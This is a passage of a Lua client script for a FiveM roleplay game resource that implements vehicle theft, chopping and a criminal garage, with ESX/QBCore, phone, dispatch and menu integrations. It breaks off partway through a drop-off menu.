print'Pug-Chopping 1.2.0'
local InsideGarage = false
local CurrentGarage = nil
local createdCamera = nil
local ViewingUpgrade = false
local RouletteTable = false
local GarageCoods = nil

local function LoadModel(model)
    if HasModelLoaded(model) then return end
	RequestModel(model)
	while not HasModelLoaded(model) do
		Wait(0)
	end
end
local function round(x)
    return x>=0 and math.floor(x+0.5) or math.ceil(x-0.5)
end
local function loadAnimDict(dict) -- interactions, job,
    while (not HasAnimDictLoaded(dict)) do
        RequestAnimDict(dict)
        Wait(10)
    end
end
local function Trim(value)
	if not value then return nil end
	return (string.gsub(value, '^%s*(.-)%s*$', '%1'))
end
local function GetPlate(vehicle)
	if vehicle == 0 then return end
    return Trim(GetVehicleNumberPlateText(vehicle))
end
-- Change this to your notification script if needed
function ChoppingNotify(msg, type, length)
	if Framework == "ESX" then
		FWork.ShowNotification(msg)
	elseif Framework == "QBCore" then
    	FWork.Functions.Notify(msg, type, length)
	end
end

-- Change this to your phone email script if needed
function ChoppingEmail(VehName, LicensePlate)
	local NewPlate = LicensePlate or "(UNKNOWN)"
	if Config.Phone == "qb-phone" then
		TriggerServerEvent('qb-phone:server:sendNewMail', {
			sender = Config.LangT["EmailHeader"],
			subject = VehName.." "..Config.LangT["EmailSubject"],
			message = Config.LangT["EmailText"].." A " .. VehName .. ". The license plate is "..NewPlate..".",
		})
	elseif Config.Phone == "qs-smartphone" then
		TriggerServerEvent('qs-smartphone:server:sendNewMail', {
			sender = Config.LangT["EmailHeader"],
			subject = VehName.." "..Config.LangT["EmailSubject"],
			message = Config.LangT["EmailText"].." A " .. VehName .. ". The license plate is "..NewPlate..".",
		})
	elseif Config.Phone == "lb-phone" then
		TriggerServerEvent("Pug:Server:SendLbPhoneMail", VehName, NewPlate)
	elseif Config.Phone == "jpr-phonesystem" then
		TriggerServerEvent('jpr-phonesystem:server:sendEmail', {
			subject = Config.LangT["EmailHeader"], -- Subject
			message = Config.LangT["EmailText"].." A " .. VehName .. ". The license plate is "..NewPlate..".", -- Content
			sender = "jpresources.client.fivem@gmail.com", -- Submitted by
			event = {}, -- Optional 
		})
	elseif Config.Phone == "roadphone" then
        local data = {
            sender = Config.LangT["EmailHeader"],
            subject = VehName.." "..Config.LangT["EmailSubject"],
            message = Config.LangT["EmailText"].." A " .. VehName .. ". The license plate is "..NewPlate..".",
        }

        exports['roadphone']:sendMail(data)
	end
end

local function HasVehicleKeys(PyCar)
	if Framework == "QBCore" then
		return exports[Config.VehilceKeysScript]:HasKeys(GetPlate(PyCar))
	else
		return true
	end
end

-- Change this to your dispatch script if needed
function CallPoliceForCarJack(LicensePlate, model,Vehicle)
	if Config.DispatchScript == "ps-dispatch" then
    	exports[Config.DispatchScript]:VehicleTheft(Vehicle)
	elseif Config.DispatchScript == "qs-dispatch" then
		local playerData = exports['qs-dispatch']:GetPlayerInfo()
		if (not playerData) then
			print('Error getting player data')
			return
		end
		exports['qs-dispatch']:getSSURL(function(image)
			TriggerServerEvent('qs-dispatch:server:CreateDispatchCall', {
				job = { 'police' },
				callLocation = playerData.coords,
				callCode = { code = alert },
				message = 'Vehicle theft in progress.',
				flashes = false,
				image = image or nil,
				blip = {
					sprite = 488,
					scale = 1.0,
					colour = 1,
					flashes = true,
					text = alert,
					time = (20 * 1000), --20 secs
				}
			})
		end)
	elseif Config.DispatchScript == "cd_dispatch" then
        local data = exports['cd_dispatch']:GetPlayerInfo()
        if (not playerData) then
            print('Error getting player data')
            return
        end
		TriggerServerEvent('cd_dispatch:AddNotification', {
			job_table = {'police', }, 
			coords = data.coords,
			title = '10-99 - Vehicle Theft',
			message = 'A '..data.sex..' is stealing a vehicle at '..data.street, 
			flash = 0,
			unique_id = data.unique_id,
			sound = 1,
			blip = {
				sprite = 431, 
				scale = 0.5, 
				colour = 3,
				flashes = true, 
				text = '911 - Vehicle Theft',
				time = 5,
				radius = 0,
			}
		})
	else
		print"^1 YOU NEED TO ADD A POLICE CALL NOTIFICATION TO THE CallPoliceForCarJack() FUNCTION IN THE OPEN.LUA"
	end
end

-- Change this to whatever your server drawtext is.
function DrawTextChopping(text)
	if Framework == "QBCore" then
		exports[Config.CoreName]:DrawText(text, 'left')
	else
		FWork.TextUI(text, "error")
	end
end

-- Change this to whatever your server hidetext is.
function HideDrawTextChopping(text)
	if Framework == "QBCore" then
		exports[Config.CoreName]:HideText()
	else
		FWork.HideUI()
	end
end

function FullyChoppedVehicleFunction(payy)
	-- Add whatever you want here for when a player finishes fully shopping a vehicle down and deletes it.

	return TriggerServerEvent("Pug:server:GiveChoppingCarPay", payy) -- This is here like this to prevent cheaters from using this event
end

-- Getting the item lable from each item function (wouldnt touch this)
function GetItemsInformation(I)
	if Framework == "QBCore" then
		print(I)
		if FWork.Shared.Items[I].label ~= nil then
			return FWork.Shared.Items[I].label
		else
			return I
		end
	else
		return I
	end
end

-- If you have a vehicle fuel script and want to set the vehicles fuel automatically you can do that here
function SetVehicleFuel(Vehicle)
	SetVehicleFuelLevel(Vehicle, 100.0)
    exports["cdn-fuel"]:SetFuel(Vehicle, 100)
end

local function ChoppingAddItem(bool, item, amount, info)
	return TriggerServerEvent("Pug:server:GiveChoppingItem", bool, item, amount, info)
end


local function GetPlayersFromCoords(coords, distance)
    local players = GetActivePlayers()
    local ped = PlayerPedId()
    if coords then
        coords = type(coords) == 'table' and vec3(coords.x, coords.y, coords.z) or coords
    else
        coords = GetEntityCoords(ped)
    end
    distance = distance or 5
    local closePlayers = {}
    for _, player in pairs(players) do
        local target = GetPlayerPed(player)
        local targetCoords = GetEntityCoords(target)
        local targetdistance = #(targetCoords - coords)
        if targetdistance <= distance then
            closePlayers[#closePlayers + 1] = player
        end
    end
    return closePlayers
end

-- This is the useable item event to remove the tracker
RegisterNetEvent('Pug:client:CustomRemoveTrackerEvent', function(isAdvanced)
    local Ped = PlayerPedId()
    if SetTracker then
        if IsPedInAnyVehicle(Ped) then
            local PyCar = GetVehiclePedIsIn(Ped)
            if PyCar == Stollenvehicle then
                if TakingToGarage then
                    if VehicleToStore ~= nil then
                        if HasVehicleKeys(PyCar) then
							if Framework == "QBCore" then
								loadAnimDict("mini@repair")
								TaskPlayAnim(PlayerPedId(), "mini@repair", "fixing_a_ped", 2.0, 2.0, 4400, 51, 0, false, false, false)
								exports[Config.MiniGameScript]:Scrambler(function(success)
									if success then
										SetTracker = false
										ClearPedTasks(PlayerPedId())
										ChoppingNotify(Config.LangT["TrackerRemoved"], 'success')
									else
										ClearPedTasks(PlayerPedId())
										ChoppingNotify(Config.LangT["Fail"], 'error')
									end
								end, "numeric", 75, 0) -- Type (alphabet, numeric, alphanumeric, greek, braille, runes), Time (Seconds), Mirrored (0: Normal, 1: Normal + Mirrored 2: Mirrored only )
							else
								loadAnimDict("mini@repair")
								TaskPlayAnim(PlayerPedId(), "mini@repair", "fixing_a_ped", 2.0, 2.0, 4400, 51, 0, false, false, false)
								ChoppingNotify(Config.LangT["3"], 'error')
								Wait(1000)
								ChoppingNotify(Config.LangT["2"], 'error')
								Wait(1000)
								ChoppingNotify(Config.LangT["1"], 'error')
								Wait(1000)
								ClearPedTasks(PlayerPedId())
								SetTracker = false
								ChoppingNotify(Config.LangT["TrackerRemoved"], 'success')
							end
						else
							ChoppingNotify(Config.LangT["NeedKeysFirst"], 'error')
                        end
                    end
                end
            end
        end
    end
end)

local function HasItem(items, amount)
	local Player = nil
	if Framework == "QBCore" then
		local DoesHasItem = "nothing"
		Config.FrameworkFunctions.TriggerCallback("Pug:serverESX:GetItemQBCore", function(HasItem)
			if HasItem then
				DoesHasItem = true
			else
				DoesHasItem = false
			end
		end, items, amount)
		while DoesHasItem == "nothing" do Wait(1) end
		return DoesHasItem
	else
		local DoesHasItem = "nothing"
		Config.FrameworkFunctions.TriggerCallback("Pug:serverESX:GetItemESX", function(HasItem)
			if HasItem then
				DoesHasItem = true
			else
				DoesHasItem = false
			end
		end, items, amount)
		while DoesHasItem == "nothing" do Wait(1) end
		return DoesHasItem
	end
end

local function PugGetPlayerMoneyCount()
	if Framework == "QBCore" then
		local Number = nil 
		Number = Config.FrameworkFunctions.GetPlayer(true, false, true).PlayerData.money.cash
		while not Number do Wait(1) end
		return Number
	else
		local Number = nil
		Config.FrameworkFunctions.TriggerCallback("Pug:serverESX:GetBalance", function(Amount)
			while not Amount do Wait(1) end
			Number = Amount
		end)
		while not Number do Wait(1) end
		return Number
	end
end

local function DeleteTestPreviews()
	if DoesEntityExist(TestPrinter) then
		DeleteEntity(TestPrinter)
	end
	if DoesEntityExist(TestBlackJack) then
		DeleteEntity(TestBlackJack)
	end
	if DoesEntityExist(PreviewRouletteTable) then
		DeleteEntity(PreviewRouletteTable)
	end
	if DoesEntityExist(PreviewPoolTable) then
		DeleteEntity(PreviewPoolTable)
	end
	if DoesEntityExist(PreviewPoolSticks) then
		DeleteEntity(PreviewPoolSticks)
	end
	if DoesEntityExist(PreviewArcade) then
		DeleteEntity(PreviewArcade)
	end
end


local function CreateTestPreviews(info)
	if Config.UpgradesMenu[info].itemupgrade == 'printermachine' then
		LoadModel("v_res_printer")
		TestPrinter = CreateObject(GetHashKey("v_res_printer"),vector3(966.39, -3003.37, -39.88))
		SetEntityHeading(TestPrinter, -90.0)
		FreezeEntityPosition(TestPrinter, true)
	elseif Config.UpgradesMenu[info].itemupgrade == 'blackjacktable' then
		LoadModel("vw_prop_casino_blckjack_01b")
		TestBlackJack = CreateObject(GetHashKey("vw_prop_casino_blckjack_01b"),vector3(967.56, -3022.42, -40.65))
		SetEntityHeading(TestBlackJack, -90.0)
		FreezeEntityPosition(TestBlackJack, true)
	elseif Config.UpgradesMenu[info].itemupgrade == 'roulettetable' then
		LoadModel("vw_prop_casino_roulette_01b")
		PreviewRouletteTable = CreateObject(GetHashKey("vw_prop_casino_roulette_01b"),vector3(967.19, -3025.37, -40.65))
		FreezeEntityPosition(PreviewRouletteTable, true)
		SetEntityHeading(PreviewRouletteTable, -90.0)
	elseif Config.UpgradesMenu[info].itemupgrade == 'pooltable' then
		LoadModel("prop_pooltable_02")
        PreviewPoolTable = CreateObject(GetHashKey("prop_pooltable_02"),vector3(961.49, -3024.33, -40.65))
        FreezeEntityPosition(PreviewPoolTable, true)
		-- PoolSticks
		LoadModel("prop_pool_rack_02")
        PreviewPoolSticks = CreateObject(GetHashKey("prop_pool_rack_02"),vector3(957.7, -3015.35, -40.1))
        FreezeEntityPosition(PreviewPoolSticks, true)
	elseif Config.UpgradesMenu[info].itemupgrade == 'arcademechine' then
		LoadModel("prop_arcade_01")
        PreviewArcade = CreateObject(GetHashKey("prop_arcade_01"),vector3(960.02, -2999.8, -40.64))
        FreezeEntityPosition(PreviewArcade, true)
		SetEntityHeading(PreviewArcade, 0.0)
	end
end

local function CreateCamera(coords, rot, bool)
    local rota = vector3(rot.x, rot.y, rot.z)
    local CamType = "DEFAULT_SCRIPTED_CAMERA"
    if not bool then
        rota = vector3(rot.x, rot.y, rot.z * -1)
        CamType = "DEFAULT_ANIMATED_CAMERA"
    end
    cam = CreateCam(CamType, 1)
    SetCamCoord(cam, coords)
    SetCamRot(cam, rota)
    RenderScriptCams(1, 0, 0, 1, 1)
    if not bool then
        local animDict = 'anim_heist@hs3f@ig9_vault_drill@laser_drill@'
        loadAnimDict(animDict)
        PlayCamAnim(cam, 'intro_cam', animDict, coords.x, coords.y, coords.z, rota, 0, 2)
    end
    Wait(250)
    createdCamera = cam
end
local function DestoryCamera()
	if createdCamera ~= 0 then
		local ped = PlayerPedId()
		DestroyCam(createdCamera, 0)
		RenderScriptCams(0, 0, 1, 1, 1)
		SetFocusEntity(GetPlayerPed(ped))
		FreezeEntityPosition(ped, false)
		createdCamera = 0
		cam = nil
	end
end
local function CleanUpGarage()
	if Config.Target == "ox_target" then
		if CrimGarageLaptop ~= nil then
			exports.ox_target:removeZone(CrimGarageLaptop)
		end
		if CriminalGarageStorage ~= nil then
			exports.ox_target:removeZone(CriminalGarageStorage)
		end
		if CrimGarageWeldBench ~= nil then
			exports.ox_target:removeZone(CrimGarageWeldBench)
		end
		if AddPrinterMachine ~= nil then
			exports.ox_target:removeZone(AddPrinterMachine)
		end
		if AddClothesTarget ~= nil then
			exports.ox_target:removeZone(AddClothesTarget)
		end
		if AddArcadeMechine ~= nil then
			exports.ox_target:removeZone(AddArcadeMechine)
		end
		if CrimGarageCraftingBench ~= nil then
			exports.ox_target:removeZone(CrimGarageCraftingBench)
		end
	else
		exports[Config.Target]:RemoveZone("CrimGarageLaptop")
		exports[Config.Target]:RemoveZone("CriminalGarageStorage")
		exports[Config.Target]:RemoveZone("CrimGarageWeldBench")
		exports[Config.Target]:RemoveZone("AddPrinterMachine")
		exports[Config.Target]:RemoveZone("AddClothesTarget")
		exports[Config.Target]:RemoveZone("AddArcadeMechine")
		exports[Config.Target]:RemoveZone("CrimGarageCraftingBench")
	end
	if DoesEntityExist(printer) then
		DeleteEntity(printer)
	end
	if DoesEntityExist(PoolTable) then
		DeleteEntity(PoolTable)
	end
	if DoesEntityExist(PoolSticks) then
		DeleteEntity(PoolSticks)
	end
	if DoesEntityExist(arcademechine) then
		DeleteEntity(arcademechine)
	end
	if DoesEntityExist(PokerTable) then
		DeleteEntity(PokerTable)
		TriggerEvent("Pug:client:RemoveBlackJackTable")
	end
end
AddEventHandler('onResourceStop', function(resource)
    if GetCurrentResourceName() == resource then
		if Config.Target == "ox_target" then
			if LeaveCriminalGarage ~= nil then
				exports.ox_target:removeZone(LeaveCriminalGarage)
			end
			if CrimGarageLaptop ~= nil then
				exports.ox_target:removeZone(CrimGarageLaptop)
			end
			if CriminalGarageStorage ~= nil then
				exports.ox_target:removeZone(CriminalGarageStorage)
			end
			if CrimGarageWeldBench ~= nil then
				exports.ox_target:removeZone(CrimGarageWeldBench)
			end
			if AddPrinterMachine ~= nil then
				exports.ox_target:removeZone(AddPrinterMachine)
			end
			if AddClothesTarget ~= nil then
				exports.ox_target:removeZone(AddClothesTarget)
			end
			if AddArcadeMechine ~= nil then
				exports.ox_target:removeZone(AddArcadeMechine)
			end
			if CrimGarageCraftingBench ~= nil then
				exports.ox_target:removeZone(CrimGarageCraftingBench)
			end
		else
			exports[Config.Target]:RemoveZone("LeaveCriminalGarage")
			exports[Config.Target]:RemoveZone("CrimGarageLaptop")
			exports[Config.Target]:RemoveZone("CriminalGarageStorage")
			exports[Config.Target]:RemoveZone("CrimGarageWeldBench")
			exports[Config.Target]:RemoveZone("AddPrinterMachine")
			exports[Config.Target]:RemoveZone("AddClothesTarget")
			exports[Config.Target]:RemoveZone("AddArcadeMechine")
			exports[Config.Target]:RemoveZone("CrimGarageCraftingBench")
		end
		if DoesEntityExist(printer) then
			DeleteEntity(printer)
		end
		if DoesEntityExist(PoolTable) then
			DeleteEntity(PoolTable)
		end
		if DoesEntityExist(PoolSticks) then
			DeleteEntity(PoolSticks)
		end
		if DoesEntityExist(arcademechine) then
			DeleteEntity(arcademechine)
		end
		if RouletteTable then
			local table = GetClosestObjectOfType(vector3(967.19, -3025.37, -40.65), 5.0, GetHashKey("vw_prop_casino_roulette_01b"), false, false, false)
			if table then
				for k,v in pairs(GetGamePool('CPed')) do
					if #(vector3(967.19, -3025.37, -40.65) - GetEntityCoords(v)) <= 5.0 then
						if GetResourceState("AdvancedParking") == 'started' then
							exports["AdvancedParking"]:DeleteVehicle(v)
						else
							TriggerEvent("FullyDeleteChoppingVehicle", v)
						end
					end
				end
				DeleteEntity(table)
			end
		end
		if CurrentGarage ~= nil then
			if CurrentGarage.carsstored ~= nil then
				for k, _ in pairs(json.decode(CurrentGarage.carsstored)) do
					if k <=  CurrentGarage.vehiclecap then
						local coords = Config.CarSpawnLocations[k]
						for _, j in pairs(GetGamePool('CVehicle')) do
							if #(GetEntityCoords(j) - vector3(coords.x,coords.y,coords.z)) <= 4 then
								if GetResourceState("AdvancedParking") == 'started' then
									exports["AdvancedParking"]:DeleteVehicle(j)
								else
									TriggerEvent("FullyDeleteChoppingVehicle", j)
								end
							end
						end
					end
				end
			end
		end
		if DoesEntityExist(PokerTable) then
			DeleteEntity(PokerTable)
			TriggerEvent("Pug:client:RemoveBlackJackTable")
		end
    end
end)
RegisterNetEvent("SpawnStoredVehiclesEvent", function()
	if CurrentGarage ~= nil then
		if CurrentGarage.carsstored ~= nil then
			for k, v in pairs(json.decode(CurrentGarage.carsstored)) do
				local coords = Config.CarSpawnLocations[k]
				local model = GetHashKey(v.car)
				RequestModel(model)
				while not HasModelLoaded(model) do
					Wait(50)
				end
				local veh = CreateVehicle(model, coords.x, coords.y, coords.z-0.3)
				while not DoesEntityExist(veh) do
					Wait(50)
				end
				SetModelAsNoLongerNeeded(model)
				SetVehicleOnGroundProperly(veh)
				SetEntityInvincible(veh, true)
				SetEntityHeading(veh, coords.w)
				SetVehicleDoorsLocked(veh, 3)
				FreezeEntityPosition(veh, true)
				SetVehicleNumberPlateText(veh, v.plate)
			end
		end
	end
end)
local function SpawnStoedVehicles()
	if CurrentGarage ~= nil then
		if CurrentGarage.carsstored ~= nil then
			for k, v in pairs(json.decode(CurrentGarage.carsstored)) do
				local coords = Config.CarSpawnLocations[k]
				local model = GetHashKey(v.car)
				RequestModel(model)
				while not HasModelLoaded(model) do
					Wait(50)
				end
				local veh = CreateVehicle(model, coords.x, coords.y, coords.z-0.3)
				while not DoesEntityExist(veh) do
					Wait(50)
				end
				SetModelAsNoLongerNeeded(model)
				SetVehicleOnGroundProperly(veh)
				SetEntityInvincible(veh, true)
				SetEntityHeading(veh, coords.w)
				SetVehicleDoorsLocked(veh, 3)
				FreezeEntityPosition(veh, true)
				SetVehicleNumberPlateText(veh, v.plate)
			end
		end
	end
end
RegisterNetEvent('QBCore:Client:OnPlayerLoaded')
AddEventHandler('QBCore:Client:OnPlayerLoaded', function()
	Wait(2000)
	if #(GetEntityCoords(PlayerPedId()) - vector3(984.61, -3002.02, -39.65)) < 90.0 then
		DoScreenFadeOut(500)
		Wait(500)
		SetEntityCoords(PlayerPedId(), -803.2, 358.71, 87.0, 0, 0, 0, false)
		SetEntityHeading(PlayerPedId(), 180.81)
		DoScreenFadeIn(500)
	end
end)
RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function()
	Wait(2000)
	if #(GetEntityCoords(PlayerPedId()) - vector3(984.61, -3002.02, -39.65)) < 90.0 then
		DoScreenFadeOut(500)
		Wait(500)
		SetEntityCoords(PlayerPedId(), -803.2, 358.71, 87.0, 0, 0, 0, false)
		SetEntityHeading(PlayerPedId(), 180.81)
		DoScreenFadeIn(500)
	end
end)

CreateThread(function()
	if #(GetEntityCoords(PlayerPedId()) - vector3(984.61, -3002.02, -39.65)) < 50.0 then
		SetEntityCoords(PlayerPedId(), -803.2, 358.71, 87.0, 0, 0, 0, false)
		SetEntityHeading(PlayerPedId(), 180.81)
	end
	if Config.Target == "ox_target" then
		LeaveCriminalGarage = exports.ox_target:addBoxZone({
			coords = vector3(971.09, -2986.75, -39.65),
			size = vector3(1, 4, 2),
			rotation = 270,
			debug = Config.Debug,
			options = {
				{
					name= "LeaveCriminalGarage",
					type = "client",
					event = "Pug:Client:CriminalGarageMenu",
					icon = "fas fa-user-secret",
					label = "Garage?",
					distance = 2.0
				}
			}
		})
	else
		exports[Config.Target]:AddBoxZone("LeaveCriminalGarage", vector3(971.09, -2986.75, -39.65), 5.8, 1, {
			name="LeaveCriminalGarage",
			heading=270,
			debugPoly = Config.Debug,
			minZ=-40.65,
			maxZ=-37.65,
		}, {
			options = {
				{
					icon = "fas fa-user-secret",
					label = "Garage?",
					action = function()
						TriggerEvent("Pug:Client:CriminalGarageMenu")
					end,
				},
			},
			distance = 2.0
		})
	end
end)

RegisterNetEvent('Pug:client:OpenCriminalGarageStorage', function()
	if CurrentGarage then
		if Framework == "QBCore" then
			if Config.InventoryType == "ox_inventory" then
				exports.ox_inventory:openInventory('stash', "warehouse_storage-"..tostring(CurrentGarage.bucketid))
			else
				TriggerServerEvent("inventory:server:OpenInventory", "stash", "warehouse_storage_"..CurrentGarage.bucketid, {
					maxweight = 1000000,
					slots = 80,
				})
				TriggerEvent("inventory:client:SetCurrentStash", "warehouse_storage_"..CurrentGarage.bucketid)
			end
		else
			exports.ox_inventory:openInventory('stash', "warehouse_storage-"..tostring(CurrentGarage.bucketid))
		end
	end
end)

RegisterNetEvent("Pug:Client:CriminalGarageMenu", function(location)
	Config.FrameworkFunctions.TriggerCallback('Pug:server:HasCrimGarageCB', function(result)
		if Config.Menu == "ox_lib" then
			local GarageMenu = {
				{
					title = Config.LangT["WarehouseGarage"],
					description = Config.LangT["CiminalEnterPrizeGarage"],
					icon = "fa-solid fa-house",
					isMenuHeader = true,
				},
			}
			if result then
				if not InsideGarage then
					GarageMenu[#GarageMenu+1] = {
						title = Config.LangT["EnterGarage"],
						icon = "fa-solid fa-arrow-up-from-bracket",
						event = "Pug:Client:EnterCriminalGarage",
						args = {
							toggle = true,
							info = result,
						}
					}
					GarageMenu[#GarageMenu+1] = {
						title = Config.LangT["EnterPassword"],
						icon = "fas fa-user-secret",
						event = "Pug:client:EnterGaragePassword",
					}
				else
					GarageMenu[#GarageMenu+1] = {
						title = Config.LangT["LeaveGarage"],
						icon = "fa-solid fa-arrow-right-from-bracket",
						event = "Pug:Client:EnterCriminalGarage",
						args = {
							toggle = false
						}
					}
				end
				lib.registerContext({
					id = 'WarehouseGarage',
					title = Config.LangT["WarehouseGarage"],
					options = GarageMenu
				})
				lib.showContext('WarehouseGarage')
			else
				if not InsideGarage then
					if location then
						GarageMenu[#GarageMenu+1] = {
							title = Config.LangT["PurchaceGarage"]..Config.GaragePrice,
							icon = "fas fa-user-secret",
							event = "Pug:Client:PurchaceCrimGarage",
							args = location
						}
					end
					GarageMenu[#GarageMenu+1] = {
						title = Config.LangT["EnterPassword"],
						icon = "fas fa-user-secret",
						event = "Pug:client:EnterGaragePassword",
					}
				else
					GarageMenu[#GarageMenu+1] = {
						title = Config.LangT["LeaveGarage"],
						icon = "fa-solid fa-arrow-right-from-bracket",
						event = "Pug:Client:EnterCriminalGarage",
						args = {
							toggle = false
						}
					}
				end
				lib.registerContext({
					id = 'WarehouseGarage',
					title = Config.LangT["WarehouseGarage"],
					options = GarageMenu
				})
				lib.showContext('WarehouseGarage')
			end
		else
			local GarageMenu = {
				{
					header = Config.LangT["WarehouseGarage"],
					txt = Config.LangT["CiminalEnterPrizeGarage"],
					icon = "fa-solid fa-house",
					isMenuHeader = true,
				},
			}
			if result then
				if not InsideGarage then
					GarageMenu[#GarageMenu+1] = {
						header = Config.LangT["EnterGarage"],
						icon = "fa-solid fa-arrow-up-from-bracket",
						params = {
							event = "Pug:Client:EnterCriminalGarage",
							args = {
								toggle = true,
								info = result,
							}
						}
					}
					GarageMenu[#GarageMenu+1] = {
						header = Config.LangT["EnterPassword"],
						icon = "fas fa-user-secret",
						params = {
							event = "Pug:client:EnterGaragePassword",
						}
					}
				else
					GarageMenu[#GarageMenu+1] = {
						header = Config.LangT["LeaveGarage"],
						icon = "fa-solid fa-arrow-right-from-bracket",
						params = {
							event = "Pug:Client:EnterCriminalGarage",
							args = {
								toggle = false
							}
						}
					}
				end
				exports[Config.Menu]:openMenu(GarageMenu)
			else
				if not InsideGarage then
					if location then
						GarageMenu[#GarageMenu+1] = {
							header = Config.LangT["PurchaceGarage"]..Config.GaragePrice,
							icon = "fas fa-user-secret",
							params = {
								event = "Pug:Client:PurchaceCrimGarage",
								args = location
							}
						}
					end
					GarageMenu[#GarageMenu+1] = {
						header = Config.LangT["EnterPassword"],
						icon = "fas fa-user-secret",
						params = {
							event = "Pug:client:EnterGaragePassword",
						}
					}
				else
					GarageMenu[#GarageMenu+1] = {
						header = Config.LangT["LeaveGarage"],
						icon = "fa-solid fa-arrow-right-from-bracket",
						params = {
							event = "Pug:Client:EnterCriminalGarage",
							args = {
								toggle = false
							}
						}
					}
				end
				exports[Config.Menu]:openMenu(GarageMenu)
			end
		end
	end)
end)
RegisterNetEvent("Pug:Client:PurchaceCrimGarage", function(args)
	TriggerServerEvent("Pug:server:PurchaceCrimGarage", args)
end)

RegisterNetEvent("CreateLaptopBoxZoneEvent", function()
	if Config.Target == "ox_target" then
		CrimGarageLaptop = exports.ox_target:addBoxZone({
			coords = vector3(963.69, -3003.54, -39.65),
			size = vector3(1, 1, 1),
			rotation = 0,
			debug = Config.Debug,
			options = {
				{
					name= "CrimGarageLaptop",
					type = "client",
					event = "Pug:Client:OpenCrimGarageLaptopMenu",
					icon = "fa-solid fa-laptop",
					label = Config.LangT["ViewLaptop"],
					distance = 2.0
				}
			}
		})
	else
		exports[Config.Target]:AddBoxZone("CrimGarageLaptop", vector3(963.69, -3003.54, -39.64), 0.8, 1, {
			name="CrimGarageLaptop",
			heading=0,
			debugPoly = Config.Debug,
			minZ=-40.44,
			maxZ=-39.44,
		}, {
			options = {
				{
					event = "Pug:Client:OpenCrimGarageLaptopMenu",
					icon = "fa-solid fa-laptop",
					label = Config.LangT["ViewLaptop"],
				},
			},
			distance = 2.0
		})
	end
end)

local function CreateLaptopBoxZone()
	if Config.Target == "ox_target" then
		CrimGarageLaptop = exports.ox_target:addBoxZone({
			coords = vector3(963.69, -3003.54, -39.65),
			size = vector3(1, 1, 1),
			rotation = 0,
			debug = Config.Debug,
			options = {
				{
					name= "CrimGarageLaptop",
					type = "client",
					event = "Pug:Client:OpenCrimGarageLaptopMenu",
					icon = "fa-solid fa-laptop",
					label = Config.LangT["ViewLaptop"],
					distance = 2.0
				}
			}
		})
	else
		exports[Config.Target]:AddBoxZone("CrimGarageLaptop", vector3(963.69, -3003.54, -39.64), 0.8, 1, {
			name="CrimGarageLaptop",
			heading=0,
			debugPoly = Config.Debug,
			minZ=-40.44,
			maxZ=-39.44,
		}, {
			options = {
				{
					event = "Pug:Client:OpenCrimGarageLaptopMenu",
					icon = "fa-solid fa-laptop",
					label = Config.LangT["ViewLaptop"],
				},
			},
			distance = 2.0
		})
	end
end
-- OUTSIDE POLYZONE
local InSideBox = false
local function CreateGarageZones(zones, name)
    local zone = PolyZone:Create(zones['Zone']['Shape'], {  -- create the zone
        name= name,
        minZ = zones['Zone']['minZ'],
        maxZ = zones['Zone']['maxZ'],
        debugPoly = Config.Debug
    })
    zone:onPlayerInOut(function(isPointInside)
        if isPointInside then
			local location = zones['Zone']['location']
			InSideBox = true
			DrawTextChopping(Config.EnterTheGarageText)
			TriggerEvent("Pug:EnterGargeHitELoop",location)
        else
			InSideBox = false
            HideDrawTextChopping()
        end
    end)
end
for k, v in pairs(Config.GarageZones) do
    CreateGarageZones(v, k)
end

-- INSIDE POLYZONE
local function CreateInsideZone(zones, name)
    local zone = PolyZone:Create(zones['Zone']['Shape'], {  -- create the zone
        name= name,
        minZ = zones['Zone']['minZ'],
        maxZ = zones['Zone']['maxZ'],
        debugPoly = Config.Debug
    })
    zone:onPlayerInOut(function(isPointInside)
        if isPointInside then
			if InsideGarage then
				if IsPedInAnyVehicle(PlayerPedId()) then
					InSideBox = true
					DrawTextChopping(Config.EnterTheGarageText)
					TriggerEvent("Pug:EnterGargeHitELoop")
				end
			end
        else
			InSideBox = false
			HideDrawTextChopping()
        end
    end)
end
for k, v in pairs(Config.InsideZone) do
    CreateInsideZone(v, k)
end

RegisterNetEvent("Pug:EnterGargeHitELoop", function(location)
	while InSideBox do
		Wait(5)
		if InSideBox then
			if IsControlJustReleased(0, Config.EnteringTheGarageKey) then
				if GetStollenvehicle() == 0 then
					TriggerEvent("Pug:Client:CriminalGarageMenu",location)
				else
					if IsPedInAnyVehicle(PlayerPedId()) then
						TriggerEvent("Pug:Client:CriminalGarageMenu",location)
					else
						TriggerEvent("Pug:Client:CriminalGarageMenu",location)
					end
				end
			end
		else
			break
		end
	end
end)

RegisterNetEvent("Pug:EnterGargeHitELoopInside", function()
	while InSideBox do
		Wait(5)
		if InSideBox then
			if IsControlJustReleased(0, Config.EnteringTheGarageKey) then
				TriggerEvent("Pug:client:VehicleManageGetRidOfMenu")
			end
		else
			break
		end
	end
end)

RegisterNetEvent("Pug:client:VehicleManageGetRidOfMenu", function()
	if IsPedInAnyVehicle(PlayerPedId()) then
		local InStolenCar = false
		local PlayerCar = GetVehiclePedIsIn(PlayerPedId())
		local Plate = GetPlate(PlayerCar)
		if CurrentGarage.carsstored ~= nil then
			for _, v in pairs(json.decode(CurrentGarage.carsstored)) do
				if v.plate == Plate then
					InStolenCar = true
					if Config.Menu == "ox_lib" then
						local LaptopMenu = {
							{
								title = v.car,
								event = "Pug:Client:OpenCrimGarageChoppingMenu",
							},
						}
						if v.health >= 1000 then
							if cooldownCheck() then
								LaptopMenu[#LaptopMenu+1] = {
									title = Config.LangT["DoDropOff"]..v.car,
									description = Config.LangT["CurrentlyCooldown"],
									icon = "fas fa-car",
									disabled = true,
									event = " ",
									args = {
										info = v,
									}
								}
							else
								LaptopMenu[#LaptopMenu+1] = {
									title = Config.LangT["DoDropOff"]..v.car,
									icon = "fas fa-car",
									serverEvent = "Pug:Server:TakeVehicleToDropOff",
									args = {
										info = v,
										Garagecoods = GarageCoods['Zone']['setplayercoords'],
									}
								}
							end
						else
							local cost = round(1000 - v.health)
							local RepairPrice = round(cost * Config.VehicleRepairMultiplier)
							LaptopMenu[#LaptopMenu+1] = {
								title = Config.LangT["Repair"]..v.car.. Config.LangT["ForMoney"].. RepairPrice,
								icon = "fas fa-car",
								serverEvent = "Pug:Server:RepairStoredVehicle",
								args = {
									info = v,
									price = RepairPrice,
								}
							}
						end
						lib.registerContext({
							id = 'DoDropOff',
							title = Config.LangT["DoDropOff"],
							options = LaptopMenu
						})
						lib.showContext('DoDropOff')
					else
						local LaptopMenu = {
							{
								header = v.car,
								params = {
